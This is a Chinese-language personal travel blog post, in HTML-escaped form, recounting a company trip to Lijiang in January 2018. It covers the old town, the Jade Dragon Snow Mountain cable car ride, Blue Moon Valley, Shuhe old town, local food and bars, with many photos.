&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x01.jpg&quot; alt=&quot;杭州&quot; /&gt;&lt;/p&gt;

&lt;p&gt;第一天安排如下:&lt;/p&gt;

&lt;p&gt;2018/01/17 早上06:30杭州&lt;strong&gt;**大酒店集合出发,前往萧山机场。搭乘航班JD51&lt;/strong&gt;**（09:05-13:05）赴丽江，抵达历史文化名城—丽江，乘车前往丽江城区金府大饭店，古城内自由活动，晚自行返回酒店。&lt;/p&gt;

&lt;p&gt;由于早上起来的比较早，大概是05:30就起来了，这时候杭州还没有天亮，早饭没有吃，本来想去商店里买一杯关东煮，但是 人家刚开始煮 ~ 就只能饿着肚子去机场了。&lt;/p&gt;

&lt;p&gt;上了大巴后，一路上也是瞌睡的状态中度过，到达机场后，抽了一根烟就开始取票、安检、上洗手间，和同事玩了一会手游就开始登机了。&lt;/p&gt;

&lt;h2 id=&quot;到达客栈&quot;&gt;到达客栈&lt;/h2&gt;

&lt;p&gt;到达丽江机场后，导游开始带领我们上车，并且介绍了丽江的少数民族以及习俗，而且还是会开车的导游！ 哈哈哈&lt;/p&gt;

&lt;p&gt;机场到达丽江古城大概有40多分钟，坐的大巴，路上会收身份证检查(查完归还)，因为现在旅游都实名制了。&lt;/p&gt;

&lt;p&gt;到达客栈后，深深的被这里的古城风格吸引了，每个家具以及环境都别具民族特色，这是在2000多米海拔上的丽江古城&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x02.jpg&quot; alt=&quot;客栈&quot; /&gt;&lt;/p&gt;

&lt;p&gt;山山水水，世外桃源……&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x13.jpg&quot; alt=&quot;客栈一角&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我住的房间门口，客栈一角，中间是有一个石桌石椅，我们晚上在这里打牌喝酒。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x09.jpg&quot; alt=&quot;客栈餐厅&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x10.jpg&quot; alt=&quot;客栈餐厅&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这里的餐厅，装修绝对不简单~ 每个做好的美食都放在保温箱里，防止食物散热，因为丽江在高原，昼夜温差比较大。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x11.jpg&quot; alt=&quot;我的早饭&quot; /&gt;&lt;/p&gt;

&lt;p&gt;起来的比较晚哈哈，当然没啥好吃的了，就只能喝点粥和牛奶……&lt;/p&gt;

&lt;h2 id=&quot;古城你好&quot;&gt;古城，你好&lt;/h2&gt;

&lt;p&gt;走在人少的古城小道，别具诗意，哈哈&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x03.jpg&quot; alt=&quot;古城小道&quot; /&gt;&lt;/p&gt;

&lt;p&gt;还有随处可见的其他客栈，基本上都会在门口立着一个牌子 —— “今日有房”&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x04.jpg&quot; alt=&quot;大花猫&quot; /&gt;&lt;/p&gt;

&lt;p&gt;如果这家客栈是在城市之中，恐怕路过的人都会拍几张，但是在丽江，这太普通了！&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x05.jpg&quot; alt=&quot;少数民族&quot; /&gt;&lt;/p&gt;

&lt;p&gt;热情的少数民族，一对情侣，这里的人们对于爱情可是有着别样的看法，若两个人不能在一起、或者是结婚，那就选择殉情，去“玉龙第三国”，就在玉龙雪山脚下，我稍后会介绍&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x12.jpg&quot; alt=&quot;古城大道&quot; /&gt;
&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x14.jpg&quot; alt=&quot;古城小道&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x18.jpg&quot; alt=&quot;古城小道&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这里万里无云，墙壁上雕刻着这些民族独有的象形文字。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x15.jpg&quot; alt=&quot;美食街&quot; /&gt;&lt;/p&gt;

&lt;p&gt;古城的美食街，我在这里吃了一碗米线，不如前面小店里的…… 可能是他们做惯了快餐 = =&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x20.jpg&quot; alt=&quot;美食街&quot; /&gt;&lt;/p&gt;

&lt;p&gt;密室逃脱都有，这里的商业发展很完善，支持微信、支付宝付款&lt;/p&gt;

&lt;h2 id=&quot;美食&quot;&gt;美食&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x06.jpg&quot; alt=&quot;土鸡米线&quot; /&gt;&lt;/p&gt;

&lt;p&gt;到了下午，饥饿感袭来，赶紧去寻找云南特色美食，米线当然是少不了的了。&lt;/p&gt;

&lt;p&gt;我们选了一家比较大的米线店，虽然这种店随处可见，但是隐隐感觉这的味道绝对不差。&lt;/p&gt;

&lt;h2 id=&quot;古城的夜晚狂欢&quot;&gt;古城的夜晚狂欢&lt;/h2&gt;

&lt;p&gt;吃完饭就回去躺了一会，比较累就没有去逛&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x07.jpg&quot; alt=&quot;古城的晚上&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x08.jpg&quot; alt=&quot;古城的晚上&quot; /&gt;&lt;/p&gt;

&lt;p&gt;到了晚上，开始狂欢！ 公司组织了一个小活动，去酒吧喝酒 —— “水泊梁山”&lt;/p&gt;

&lt;p&gt;晚上人比较多，开着导航都容易走错，小道大道错综复杂。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x16.jpg&quot; alt=&quot;水泊梁山&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x17.jpg&quot; alt=&quot;水泊梁山&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在这里有一种“午夜销魂酒”，我喝了不少，还有“飞花雪月”~~  手中拿着酒壶，就像是古代里的侠客 ~ 哈哈&lt;/p&gt;

&lt;p&gt;最后的最后我还是喝多了，回到客栈就吐了 2333  然后躺倒，一觉睡到第二天早上&lt;/p&gt;

&lt;h2 id=&quot;最美老板娘&quot;&gt;最美老板娘&lt;/h2&gt;

&lt;p&gt;第一晚跟着同事去看了这个抖音网红&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x19.jpg&quot; alt=&quot;最美老板娘&quot; /&gt;&lt;/p&gt;

&lt;p&gt;她是卖民鼓的，演奏的很好听~&lt;/p&gt;

&lt;h2 id=&quot;登上玉龙雪山的前奏&quot;&gt;登上玉龙雪山的前奏&lt;/h2&gt;

&lt;p&gt;玉龙雪山为云南省丽江市境内雪山群，地处东经100°4′2″～100°16′30″、北纬27°3′2″～27°18′57″之间，在丽江北面约15千米处，全长75千米，是北半球最近赤道终年积雪的山脉，隔江西与中甸雪山、东与绵绵山相并列，北自三江口，向南延伸到北纬27°，如扇面向古城展开。全山的13座山峰由南向北纵向排列，主峰扇子陡最高处海拔5596米，终年积雪，发育有亚欧大陆距离赤道最近的温带海洋性冰川。&lt;/p&gt;

&lt;p&gt;早上很早就起来了，因为索道需要排队，我们排到了中午，天气很好。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x21.jpg&quot; alt=&quot;坐车去玉龙雪山脚下&quot; /&gt;&lt;/p&gt;

&lt;p&gt;坐车去玉龙雪山脚下。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x22.jpg&quot; alt=&quot;购买氧气罐&quot; /&gt;&lt;/p&gt;

&lt;p&gt;由于玉龙雪山海拔比较高，高到穿透了云层，登山的时候氧气稀薄，必须购买一个氧气罐，补充氧气，一罐大概60元。&lt;/p&gt;

&lt;p&gt;PS:购买氧气罐必须要去专业的供氧中心，以防买到“压缩空气”&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x23.jpg&quot; alt=&quot;供氧中心&quot; /&gt;&lt;/p&gt;

&lt;p&gt;到达玉龙雪山脚下&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x24.jpg&quot; alt=&quot;到达雪山脚下&quot; /&gt;&lt;/p&gt;

&lt;p&gt;云雾缭绕的上面就是玉龙雪山、路上导游也介绍了玉龙雪山相关的景色以及乘坐索道的注意事项，还有玉龙雪山的特色（国家保护动物、植物、药材）&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x25.jpg&quot; alt=&quot;安检&quot; /&gt;&lt;/p&gt;

&lt;p&gt;进入玉龙雪山需要乘坐一段时间大巴车，到达乘坐索道的地点，首先需要安检、刷身份证来验票，整个旅游的景点都是只需要刷身份证就可以了，非常方便。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x26.jpg&quot; alt=&quot;下车&quot; /&gt;&lt;/p&gt;

&lt;p&gt;下车后看到路边有一些积雪、气温开始下降，大家去的话一定要带厚衣服。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x27.jpg&quot; alt=&quot;索道&quot; /&gt;&lt;/p&gt;

&lt;p&gt;开始排队、进行索道安检，期间看到索道上的缆车通过钢缆送上云端，不经感叹人类的智慧力量，那可是5000多米的海拔，通过电力就可以把人送上去。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x28.jpg&quot; alt=&quot;海拔说明&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在过了安检后，我路过了一个展览牌，里面标识了每一个海拔点。&lt;/p&gt;

&lt;p&gt;通过缆车将人送到4506米的海拔高度，然后再通过楼梯，爬上4680的海拔高度。我一开始是想登上5596米的，但是只能上到4680…. 
后面你会看到我的狼狈、怎么说也是年轻的小伙，爬一百多米就不行了。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x29.jpg&quot; alt=&quot;缆车启动&quot; /&gt;&lt;/p&gt;

&lt;p&gt;缆车开始驶离起点，直冲云霄~&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x30.jpg&quot; alt=&quot;缆车上的景色&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在缆车上可以看到山上的植被，好像大多是松树，还有常年不化的积雪。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x34.jpg&quot; alt=&quot;开始冲破云层&quot; /&gt;
&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x31.jpg&quot; alt=&quot;开始冲破云层&quot; /&gt;&lt;/p&gt;

&lt;p&gt;开始冲破云层&lt;/p&gt;

&lt;h2 id=&quot;天上的景色&quot;&gt;天上的景色&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x32.jpg&quot; alt=&quot;天上的景色&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x33.jpg&quot; alt=&quot;天上的景色&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;着陆后&quot;&gt;着陆后&lt;/h2&gt;

&lt;p&gt;下了缆车，看到许多人，然后我的嘴唇开始泛白、头有点晕，感觉开始吸氧，向楼梯走去，绝对不能倒在起点啊 哈哈&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x35.jpg&quot; alt=&quot;天上的景色&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x36.jpg&quot; alt=&quot;天上的景色&quot; /&gt;&lt;/p&gt;

&lt;p&gt;走到三分之一，来一张美照~&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x37.jpg&quot; alt=&quot;天上的景色&quot; /&gt;&lt;/p&gt;

&lt;p&gt;手拿氧气罐~ 酷酷的站在云海边缘~&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x38.jpg&quot; alt=&quot;天上的景色&quot; /&gt;&lt;/p&gt;

&lt;p&gt;此时已到海拔 4470 米&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x39.jpg&quot; alt=&quot;天上的景色&quot; /&gt;&lt;/p&gt;

&lt;p&gt;后面的人群……&lt;/p&gt;

&lt;h2 id=&quot;登上人生第一个巅峰&quot;&gt;登上人生第一个巅峰&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x40.jpg&quot; alt=&quot;天上的景色&quot; /&gt;&lt;/p&gt;

&lt;p&gt;此时已经瘫倒在地上……&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x41.jpg&quot; alt=&quot;天上的景色&quot; /&gt;&lt;/p&gt;

&lt;p&gt;海拔 4680米的高空，一眼望去 太阳、云海、人群，让我更加热爱生活，期待更多的风景。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x42.jpg&quot; alt=&quot;天上的景色&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x43.jpg&quot; alt=&quot;天上的景色&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x44.jpg&quot; alt=&quot;天上的景色&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我的装备，一瓶水、一部手机、一个必备的氧气罐，以及背包&lt;/p&gt;

&lt;h2 id=&quot;下山&quot;&gt;下山&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x45.jpg&quot; alt=&quot;天上的景色&quot; /&gt;&lt;/p&gt;

&lt;p&gt;下山的时候比较轻松了，但是还是要时不时的吸氧，腿很酸&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x46.jpg&quot; alt=&quot;天上的景色&quot; /&gt;&lt;/p&gt;

&lt;p&gt;更加敬畏自然。&lt;/p&gt;

&lt;h2 id=&quot;蓝月谷&quot;&gt;蓝月谷&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x47.jpg&quot; alt=&quot;天上的景色&quot; /&gt;&lt;/p&gt;

&lt;p&gt;从缆车上下来 就坐车去蓝月谷了，还遇到了羊驼 哈哈哈  真的很萌呢 ~&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x48.jpg&quot; alt=&quot;蓝月谷&quot; /&gt;&lt;/p&gt;

&lt;p&gt;水很清澈&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x49.jpg&quot; alt=&quot;蓝月谷&quot; /&gt;&lt;/p&gt;

&lt;p&gt;走累了就休息一会~&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x50.jpg&quot; alt=&quot;蓝月谷&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x51.jpg&quot; alt=&quot;蓝月谷&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x52.jpg&quot; alt=&quot;蓝月谷&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;印象丽江&quot;&gt;印象丽江&lt;/h2&gt;

&lt;p&gt;中午吃完饭就去看实景舞台剧，全部都是少数民族，演出持续了一个多小时，我到最后都开始打瞌睡了，因为实在是太累了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x53.jpg&quot; alt=&quot;印象丽江&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x54.jpg&quot; alt=&quot;印象丽江&quot; /&gt;&lt;/p&gt;

&lt;p&gt;从座位上可以直接看到玉龙雪山~&lt;/p&gt;

&lt;p&gt;期间还有殉情那段，简直美到不行！&lt;/p&gt;

&lt;p&gt;殉情是丽江纳西族婚姻关系中突出的现象，丽江纳西族的民风是：
男女在结婚前，有社交的自由，各种节日和大小庙会，青年们相约同去游玩，小伙子也结队出门，手持柳枝在路旁等候，依据传统风俗，姑娘要带些米花糖，糕饼之类在身边，以分赠给向自己讨吃的小伙子。男青年在姑娘门前路过时，向自己看中的姑娘讨东西吃，介此达到交往的目的。节日夜晚，男女青年相约到河边相会，并通过弹口弦，唱调子，表示情意。但男女不能面对面和肩靠肩坐在一起，一般需要隔一道水沟或一簇茨蓬，至少也要相隔两三米才能交谈或唱和。 情投意合的男女常常私订婚约。&lt;/p&gt;

&lt;p&gt;退场的时候还是忍不住拍了几张雪山的照片  :)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x55.jpg&quot; alt=&quot;雪山&quot; /&gt;
&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x56.jpg&quot; alt=&quot;雪山&quot; /&gt;
&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x57.jpg&quot; alt=&quot;雪山&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;束河古镇&quot;&gt;束河古镇&lt;/h2&gt;

&lt;p&gt;束河古镇，纳西语称“绍坞”，因村后聚宝山形如堆垒之高峰，以山名村，流传变异而成，意为“高峰之下的村寨”，是纳西先民在丽江坝子中最早的聚居地之一，是茶马古道上保存完好的重要集镇。&lt;/p&gt;

&lt;p&gt;也是纳西先民从农耕文明向商业文明过渡的活标本，是对外开放和马帮活动形成的集镇建设典范。束河是世界文化遗产丽江古城的重要组成部分，于2005年入选CCTV“中国魅力名镇”。&lt;/p&gt;

&lt;p&gt;进入束河村，你可直抵束河中心集市，在这里你会有一种似曾相识的感觉，这是一个类似大研镇古城四方街的广场，面积约250平方米，亦称束河四方街，赶集的日子里异常热闹，曾是丽江皮毛交易集散之地。广场四周均为店铺，古老的木板门面，暗红色油漆。还有店前黑亮的青石，脚下斑驳的石坡路面，以及闲坐的老人，勾勒出束河古朴自然本色。站在广场中心，你细细观察体会，大研古城四方街完全是束河的翻版，纳西民族由游牧向农耕，再走向城市，从这里你可找出一些痕迹。沿束河街北走100米，便可找到溪流的源头“九鼎龙潭”，潭水透明清澈，日夜涌泉，束河人奉为神泉，于是建有龙泉寺。&lt;/p&gt;

&lt;p&gt;相比于我住的丽江古城要小一点，束河古镇里更多的交通工具是马车&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x58.jpg&quot; alt=&quot;束河古镇&quot; /&gt;&lt;/p&gt;

&lt;p&gt;茶楼很复古，路上都是石头路，非常有感觉，听导游说里面还有一个三百多年历史的古桥&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x59.jpg&quot; alt=&quot;束河古镇&quot; /&gt;&lt;/p&gt;

&lt;p&gt;建筑门口都有一个小河道，水很清澈，这边的人经常用桶来打水浇花。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x60.jpg&quot; alt=&quot;束河古镇&quot; /&gt;&lt;/p&gt;

&lt;p&gt;离开喧嚣的人群，我比较喜欢这个小道，门面也很少，夕阳照射到这里面感觉非常美丽&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x61.jpg&quot; alt=&quot;束河古镇&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x62.jpg&quot; alt=&quot;束河古镇&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x63.jpg&quot; alt=&quot;束河古镇&quot; /&gt;&lt;/p&gt;

&lt;p&gt;走到这里有一个石头泥砖墙，好像没有人居住，但是上面的植被长得非常茂密。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x64.jpg&quot; alt=&quot;束河古镇&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x65.jpg&quot; alt=&quot;束河古镇&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x66.jpg&quot; alt=&quot;束河古镇&quot; /&gt;&lt;/p&gt;

&lt;p&gt;很大的一家咖啡厅……房子周边都有河道&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x67.jpg&quot; alt=&quot;束河古镇&quot; /&gt;&lt;/p&gt;

&lt;p&gt;别具色彩的指路牌~  超喜欢&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x68.jpg&quot; alt=&quot;束河古镇&quot; /&gt;&lt;/p&gt;

&lt;p&gt;路上还遇到两只小狗，一点都不怕生，我把手机打开给它拍照，它还自己凑过来&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x69.jpg&quot; alt=&quot;束河古镇&quot; /&gt;&lt;/p&gt;

&lt;p&gt;当然要拍一下背影了~ ！&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x70.jpg&quot; alt=&quot;束河古镇&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x71.jpg&quot; alt=&quot;束河古镇&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在这条街上，有一家咖啡店，大概是好多人的梦想吧……&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x72.jpg&quot; alt=&quot;束河古镇&quot; /&gt;&lt;/p&gt;

&lt;p&gt;少有人来的小巷&lt;/p&gt;

&lt;h2 id=&quot;纳西族的博物馆&quot;&gt;纳西族的博物馆&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x76.jpg&quot; alt=&quot;纳西族的博物馆&quot; /&gt;&lt;/p&gt;

&lt;p&gt;一开始想进博物馆看看，但是没买博物馆的门票，进不去，但是这个展馆是在博物馆出口处，刚好可以偷偷进去看看 嘿嘿&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x75.jpg&quot; alt=&quot;纳西族的博物馆&quot; /&gt;&lt;/p&gt;

&lt;p&gt;纳西族的火枪&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x74.jpg&quot; alt=&quot;纳西族的博物馆&quot; /&gt;&lt;/p&gt;

&lt;p&gt;用于装水的革囊&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x73.jpg&quot; alt=&quot;纳西族的博物馆&quot; /&gt;&lt;/p&gt;

&lt;p&gt;辛勤劳作的纳西族&lt;/p&gt;

&lt;h2 id=&quot;束河古镇街头的那些酒吧&quot;&gt;束河古镇街头的那些酒吧&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x77.jpg&quot; alt=&quot;束河古镇街头的那些酒吧&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这里坐着的大部分是美少女和帅男，我迟迟不敢靠近 哈哈！&lt;/p&gt;

&lt;p&gt;不过驻唱唱的歌确实好听&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x78.jpg&quot; alt=&quot;束河古镇街头的那些酒吧&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x79.jpg&quot; alt=&quot;束河古镇街头的那些酒吧&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x80.jpg&quot; alt=&quot;束河古镇街头的那些酒吧&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;返程之前的年会&quot;&gt;返程之前的年会&lt;/h2&gt;

&lt;p&gt;上午开会，总结工作，顺便拍了公司全体人员的合照。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x81.jpg&quot; alt=&quot;返程之前的年会&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x82.jpg&quot; alt=&quot;返程之前的年会&quot; /&gt;&lt;/p&gt;

&lt;p&gt;走在去大水车的路上……&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x83.jpg&quot; alt=&quot;返程之前的年会&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这里大多是情侣挂上的许愿牌，应该是这么叫。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x84.jpg&quot; alt=&quot;返程之前的年会&quot; /&gt;&lt;/p&gt;

&lt;p&gt;著名的丽江古城大水车&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x85.jpg&quot; alt=&quot;返程之前的年会&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-01-22/0x86.jpg&quot; alt=&quot;返程之前的年会&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在这还可以看到玉龙雪山~&lt;/p&gt;

